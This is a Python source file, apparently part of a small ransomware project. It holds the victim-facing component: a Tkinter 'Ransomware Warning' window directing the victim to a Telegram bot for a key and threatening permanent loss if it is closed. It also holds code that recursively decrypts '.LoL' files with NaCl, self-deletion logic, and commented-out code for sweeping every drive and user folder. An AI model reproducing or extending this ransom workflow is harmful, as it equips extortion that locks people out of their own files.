import telegram, asyncio             
from nacl.public import PrivateKey, PublicKey, Box
import nacl, nacl.secret
from datetime import datetime
from time import sleep
import os, sys, ctypes, tkinter
from tkinter import messagebox
from threading import Thread
import threading
import time
from multiprocessing import Process
from PIL import Image, ImageDraw, ImageFont
from tkinter import Label, Entry, Button
import base64

#0. 기본 환경설정
AES_BOX=0
DecryptModule=0
PRIVATE_KEY_AES=0

MaxThread=120
ThreadPool=[]
IsAdmin=ctypes.windll.shell32.IsUserAnAdmin()

PathList=[]
PathList_DEBUG=[]

entry=0

filePath='./Client_after_enc.py'

def setDecryptModule(privateKeyAES):
    global DecryptModule
    DecryptModule=nacl.secret.SecretBox(privateKeyAES)
    
class Decryptor:
    def __init__(self, files=0, decryptModule=0):
        self._files=files

    @classmethod
    def decEach(self, path):
        originName=path.strip(".LoL")
        with open(path, "rb") as File:
            data=File.read()
        decryptedFile=DecryptModule.decrypt(data)
        with open(originName, "wb") as File:
            File.write(decryptedFile)
        os.remove(path)

    def decryptFile(self):
        try:
            for file in self._files:
                if(os.path.isfile(file)==True):
                    if(file==sys.argv[0]):
                        return
                    extension=os.path.splitext(file)[-1]
                    if(extension!='.LoL'):
                        continue;
                    
                    if(os.path.getsize(file)>50000000):
                        if (len(ThreadPool)<MaxThread):
                            th=Process(target=Decryptor.decEach, args=(file,))
                            ThreadPool.append(th)
                            th.start()
                        else:
                            self.decEach(file)
                    else :
                        self.decEach(file)
        except Exception as e:
            print(f"[DEBUG] Error on EnDecrypt.encryptFile(): {e}")

def listUpTargetDir():
    global PathList, PathList_DEBUG
    #PathList=[r"C:\Users\\"]
    #for letter in range(97, 123):
    #    drive=f"{chr(letter)}:\\"
    #    if (pathlib.Path(drive).exists()):
    #        PathList.append(drive)
    #PathList.remove("c:\\")
    #print(f"[DEBUG] PathList: {PathList}")
    PathList_DEBUG=["E:\\github\\-ransomware\\최지웅\\molly"]


def recursiveDecrypt(basepath):
    files=[]
    dirs=[]
    for entry in os.listdir(basepath):
        absolutePath=os.path.join(basepath, entry)
        if os.path.isfile(absolutePath):
            files.append(absolutePath)
        elif os.path.isdir(absolutePath):
            dirs.append(absolutePath)

    if (len(files)>0):
        Decryptor(files).decryptFile()
    for dir in dirs:
        recursiveDecrypt(dir)

#복호화
def decryptComputer():
    global entry
    buf=entry.get()
    try:
        AESKey=base64.b64decode(buf[10:])
        setDecryptModule(AESKey)
        print("Start Decryption... Do not turn off computer...")
        start=time.time()
        for drive in PathList_DEBUG:
            recursiveDecrypt(drive)
            while (len(ThreadPool)!=0):
                th=ThreadPool.pop()
                th.join()
        end=time.time()
        print(end-start)
        print("User computer is unlocked! Thank you for using our service:):):):):) Bye!")
        
        sleep(10)
        os.remove(filePath)
    except Exception as e:
        print("AESKey is not correct!", e)
        

def ransomewareWarning():
    global entry
    WINDOW=tkinter.Tk()
    WINDOW.title('Ransomware Warning')
    WINDOW.geometry('400x100')
    WINDOW.resizable(False, False)

    lab=Label(WINDOW)
    lab['text']='Input Key for Decryption: '
    lab.pack()
    entry=Entry(WINDOW)
    entry.pack()
    lab2=Label(WINDOW)
    lab2['text']='If you turn off this window, You cannot get back your computer:)'
    lab2.pack()
    lab3=Label(WINDOW)
    lab3['text']='Send Message to @rans_key_bot by using telegram'
    lab3.pack()
    btn=Button(WINDOW, text="decrypt!", command=decryptComputer)
    btn.pack()
    
    WINDOW.mainloop()

if __name__=='__main__':
    listUpTargetDir()
    ransomewareWarning()
